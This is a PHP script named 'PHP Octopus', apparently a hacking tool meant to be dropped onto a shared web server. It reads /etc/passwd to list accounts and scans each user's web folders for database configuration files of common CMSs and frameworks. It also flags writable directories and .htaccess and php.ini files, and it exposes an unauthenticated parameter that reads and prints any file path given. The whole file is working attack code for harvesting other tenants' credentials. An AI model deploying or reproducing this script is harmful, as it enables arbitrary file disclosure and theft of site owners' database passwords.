<?php
/**
 * Created by PhpStorm.
 * User: lenon
 * Date: 27/08/16
 * Time: 14:44.
 */
if (isset($_GET['pathfile']) && !empty($_GET['pathfile'])) {
    $myfile = fopen($_GET['pathfile'], 'r') or die('Unable to open file!');
    echo '<pre>'.htmlspecialchars(fread($myfile, filesize($_GET['pathfile']))).'<pre>';
    fclose($myfile);
    exit();
}
?>
<html>
<head>
    <link rel="stylesheet" href="//code.jquery.com/ui/1.12.0/themes/base/jquery-ui.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.12/css/jquery.dataTables.min.css">
    <script type="application/javascript" src="//code.jquery.com/jquery-1.12.3.js"></script>
    <script type="application/javascript" src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
    <script type="application/javascript" src="https://code.jquery.com/ui/1.12.0/jquery-ui.js"></script>
    <script type="application/javascript">
        $(document).ready(function() {
            $('a.modalasz').click(function(){
                e.preventDefault();
            });
            $('#table').on( 'draw.dt', function () {
                $('.modalasz').click(function () {

                    console.log('click');
                    if($(this).attr('data-path')!=""){
                        $.get("?pathfile="+$(this).attr('data-path'), function(data) {
                            $('#myModal').html(data);
                        });
                    }else{
                        $('#myModal').html("folder with permission writter");
                    }

                    $('#myModal').dialog({
                        width: 1000,
                        position: { my: 'top', at: 'top+50' },
                    });

                });
            });
            $('#table').DataTable({
                "aaSorting": [
                    [ 1, "desc" ],
                    [ 3, "desc" ],
                    [ 10, "desc" ],
                    [ 9, "desc" ],
                    [ 15, "desc" ],
                    [ 16, "desc" ],
                    [ 6, "desc" ],
                    [ 7, "desc" ],
                ]
            });

        } );
    </script>
    <style>
        #myModal{
            background: black;
            color: #fff;
        }
        .modalasz{
            cursor: pointer;
        }
    </style>
</head>
<body>

<h1>PHP Octopus</h1>
<?php

if (@file('/etc/passwd')) {
    $users = file('/etc/passwd');

    $count['pathindex'] = 0;
    $count['pathpublicwritter'] = 0;
    $count['folderDefault'] = 0;
    $count['pathconfd6'] = 0;
    $count['pathconfd7'] = 0;
    $count['pathWriterJoo'] = 0;
    $count['pathWriterWp'] = 0;
    $count['pathVb'] = 0;
    $count['pathJoo'] = 0;
    $count['pathWp'] = 0;
    $count['pathLaravel'] = 0;
    $count['pathCodeigniter'] = 0;
    $count['pathSymfony'] = 0;
    $count['pathZend'] = 0;
    $count['pathhtaccess'] = 0;
    $count['pathphpini'] = 0;
    $total = 0; ?>
<table id="table" class="display" cellspacing="0" width="100%">
    <thead>
    <tr>

        <th>
            user
        </th>
        <th>
            index.php
        </th>
        <th>
            root user writter
        </th>
        <th>
            files of config database
        </th>
        <th>
            file of config Drupal 6
        </th>
        <th>
            file of config Drupal 7
        </th>
        <th>
            writer folder /image/ or /tmp/ Joomla
        </th>
        <th>
            writer folder /uploads/ WordPress
        </th>
        <th>
            file of config vbulletin
        </th>
        <th>
            file of config joomla
        </th>
        <th>
            file of config WordPress
        </th>
        <th>
            file of config Laravel
        </th>
        <th>
            file of config Codeigniter
        </th>
        <th>
            file of config Symfony
        </th>
        <th>
            file of config Zend Framework
        </th>
        <th>
            htaccess
        </th>
        <th>
            php.ini
        </th>
    </tr>
    </thead>
    <tfoot>
    <tr>

        <th>
            user
        </th>
        <th>
            index.php
        </th>
        <th>
            root user writter
        </th>
        <th>
            files of config database
        </th>
        <th>
            file of config Drupal 6
        </th>
        <th>
            file of config Drupal 7
        </th>
        <th>
            write joom up
        </th>
        <th>
            writer folder /uploads/
        </th>
        <th>
            file of config vbulletin
        </th>
        <th>
            file of config joomla
        </th>
        <th>
            file of config WordPress
        </th>
        <th>
            file of config Laravel
        </th>
        <th>
            file of config Codeigniter
        </th>
        <th>
            file of config Symfony
        </th>
        <th>
            file of config Zend Framework
        </th>
        <th>
            htaccess
        </th>
        <th>
            php.ini
        </th>
    </tr>
    </tfoot>
    <tbody align="center">
    <?php
    $homes[] = 'home';
    $homes[] = 'home1';
    $homes[] = 'home2';
    $homes[] = 'home3';
    $homes[] = 'home4';
    $homes[] = 'home5';

    $public_folders[] = 'public_html';
    $public_folders[] = 'www';

    foreach ($homes as $keyHome => $home) {
        foreach ($users as $key => $user) {
            if ((is_dir('/'.$home.'/'.$userfinal[0].'/'.$public_folders[0].'/')) &&
                (is_dir('/'.$home.'/'.$userfinal[0].'/'.$public_folders[1].'/'))) {
                unset($public_folders[1]);
            }
            foreach ($public_folders as $public_folder) {
                $userfinal = explode(':', $user);
                if (is_dir('/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/')) {
                    ?>

                    <tr>

                        <td>
                            <?php echo $userfinal[0]; ?>
                        </td>
                        <td>
                            <?php
                            $pathindex = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/index.php';
                    if (file_exists($pathindex)) {
                        ++$count['pathindex']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    }
                    if (is_writable($pathindex)) {
                        ++$count['pathindex']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"
                                   >
                                    &#10004;
                                </span>
                                w
                                <?php

                    } ?>
                        </td>
                        <td>
                            <?php
                            $pathpublicwritter = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/';
                    if (is_writable($pathpublicwritter)) {
                        ++$count['pathpublicwritter']; ?>
                                <span id="teste" class="btn btn-info modalasz"
                                   data-path="<?php echo $pathpublicwritter; ?>">
                                    &#10004;
                                </span>
                                w
                                <?php

                    } ?>
                        </td>
                        <td>
                            <?php
                            unset($url);

                    $url = [];
                    $folderDefaults = [];
                    $folderDefaults[] = '';
                    $folderDefaults[] = 'includes/';
                    $folderDefaults[] = 'include/';
                    $folderDefaults[] = 'config/';
                    $folderDefaults[] = 'configs/';
                    $folderDefaults[] = 'common/';
                    $folderDefaults[] = 'classes/';
                    $folderDefaults[] = 'class/';
                    $folderDefaults[] = 'site/';
                    $folderDefaults[] = 'admin/';
                    $folderDefaults[] = 'adm/';
                    $folderDefaults[] = 'admin/includes/';
                    $folderDefaults[] = 'admin/include/';
                    $folderDefaults[] = 'admin/config/';
                    $folderDefaults[] = 'admin/configs/';
                    $folderDefaults[] = 'admin/common/';
                    $folderDefaults[] = 'admin/classes/';
                    $folderDefaults[] = 'admin/class/';
                    foreach ($folderDefaults as $keyFolder => $folderDefault) {
                        if ($keyFolder != 0) {
                            $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'configuration.php';
                        }
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'dbconnect.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'application.ini';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'config.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'database.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'conexao.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'conexaodb.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'conexaoDB.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'connection.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'conectar.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'conecta.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'db.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'DB.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'bd.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'connectDB.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'connectdb.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'con.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'defines.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'conn.php';
                        $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/'.$folderDefault.'configuracao.php';
                    }

                    $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/app/config/database.yml';
                    $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/app/config/config.yml';
                    $url[] = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/app/config/parameters.yml';

                    foreach ($url as $u) {
                        if (file_exists($u)) {
                            ++$count['folderDefault']; ?>
                                    <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $u; ?>" >
                                        &#10004;
                                    </span>
                                    <?php

                        }
                    } ?>
                        </td>
                        <td>
                            <?php
                            $pathconfd6 = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/sites/default/default.settings.php';
                    if (file_exists($pathconfd6)) {
                        ++$count['pathconfd6']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd6; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>
                        </td>
                        <td>
                            <?php
                            $pathconfd7 = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/sites/default/settings.php';
                    if (file_exists($pathconfd7)) {
                        ++$count['pathconfd7']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd7; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>
                        </td>
                        <td>
                            <?php
                            if ((is_writable('/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/images/')) or (is_writable('/home/'.$userfinal[0].'/'.$public_folder.'/tmp/'))) {
                                ++$count['pathWriterJoo']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo ''; ?>" >
                                    &#10004;
                                </span>
                                w
                                <?php

                            } ?>
                        </td>
                        <td>
                            <?php
                            if (is_writable('/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/wp-content/uploads/')) {
                                ++$count['pathWriterWp']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo ''; ?>" >
                                    &#10004;
                                </span>
                                w
                                <?php

                            } ?>
                        </td>

                        <td>
                            <?php
                            $pathconfvb = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/core/includes/config.php';
                    if (file_exists($pathconfvb)) {
                        ++$count['pathVb']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfvb; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>

                        </td>
                        <td>
                            <?php
                            $pathconfjoom = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/configuration.php';
                    if (file_exists($pathconfjoom)) {
                        ++$count['pathJoo']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfjoom; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>

                        </td>
                        <td>
                            <?php
                            $pathwpconfig = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/wp-config.php';
                    if (file_exists($pathwpconfig)) {
                        ++$count['pathWp']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathwpconfig; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>

                        </td>
                        <td>
                            <?php
                            $pathlaravel = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/config/database.php';
                    if (file_exists($pathlaravel)) {
                        ++$count['pathLaravel']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathlaravel; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>

                        </td>
                        <td>
                            <?php
                            $pathcodeigniter = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/../application/config/database.php';
                    if (file_exists($pathcodeigniter)) {
                        ++$count['pathCodeigniter']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathcodeigniter; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>

                        </td>
                        <td>
                            <?php
                            $pathsymfony = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/../app/config/parameters.yml';
                    if (file_exists($pathsymfony)) {
                        ++$count['pathSymfony']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathsymfony; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>

                        </td>
                        <td>
                            <?php
                            $pathzend = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/../application/configs/application.ini';
                    if (file_exists($pathzend)) {
                        ++$count['pathZend']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathzend; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>

                        </td>
                        <td>
                            <?php
                            $pathhtaccess = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/.htaccess';
                    if (file_exists($pathhtaccess)) {
                        ++$count['pathhtaccess']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>"
                                   >
                                    &#10004;
                                </span>
                                r
                                <?php

                    }
                    if (is_writable($pathhtaccess)) {
                        ++$count['pathhtaccess']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>"
                                   >
                                    &#10004;
                                </span>
                                w
                                <?php

                    } ?>

                        </td>
                        <td>
                            <?php
                            $pathphpini = '/'.$home.'/'.$userfinal[0].'/'.$public_folder.'/php.ini';
                    if (file_exists($pathphpini)) {
                        ++$count['pathphpini']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    }
                    if (is_writable($pathphpini)) {
                        ++$count['pathphpini']; ?>
                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>"
                                   >
                                    &#10004;
                                </span>
                                <?php

                    } ?>

                        </td>
                    </tr>

                    <?php

                }
            }
        }
    } ?>
    </tbody>
    <?php

}
    ?>

</table>
<fieldset id="bodyTitle">
    <legend>Total Detail</legend>
    <ul id="listOfTotalDetail">

        <li>
            Total of <?php echo $count['pathindex']; ?> files index.php for read
        </li>
        <li>
            Total of <?php echo $count['pathpublicwritter']; ?> folder public root for writer
        </li>
        <li>
            Total of <?php echo $count['folderDefault']; ?> files default config database read
        </li>
        <li>
            Total of <?php echo $count['pathconfd6']; ?> drupal 6 config database read
        </li>
        <li>
            Total of <?php echo $count['pathconfd7']; ?>  drupal 7 config database read
        </li>
        <li>
            Total of <?php echo $count['pathWriterJoo']; ?> folder of writer in joomla
        </li>
        <li>
            Total of <?php echo $count['pathWriterWp']; ?> folder of writer in WordPress
        </li>
        <li>
            Total of <?php echo $count['pathVb']; ?> vBulletin  config database read
        </li>
        <li>
            Total of <?php echo $count['pathJoo']; ?> joomla  config database read
        </li>
        <li>
            Total of <?php echo $count['pathWp']; ?> WordPress config database read
        </li>
        <li>
            Total of <?php echo $count['pathLaravel']; ?> Laravel config database read
        </li>
        <li>
            Total of <?php echo $count['pathCodeigniter']; ?> Codeigniter config database read
        </li>
        <li>
            Total of <?php echo $count['pathSymfony']; ?> Symfony config database read
        </li>
        <li>
            Total of <?php echo $count['pathZend']; ?> Zend config database read
        </li>
        <li>
            Total of <?php echo $count['pathhtaccess']; ?> htaccees read
        </li>
        <li>
            Total of <?php echo $count['pathphpini']; ?> php.ini read
        </li>
        <li>
            <h3>Total of
            <?php foreach ($count as $c) {
        $total += $c;
    }
            echo $total;
            ?>
            sensitive files found
                </h3>

        </li>
    </ul>
</fieldset>
<!-- Modal -->
<div id="myModal" role="dialog">

</div>

</body>
</html>
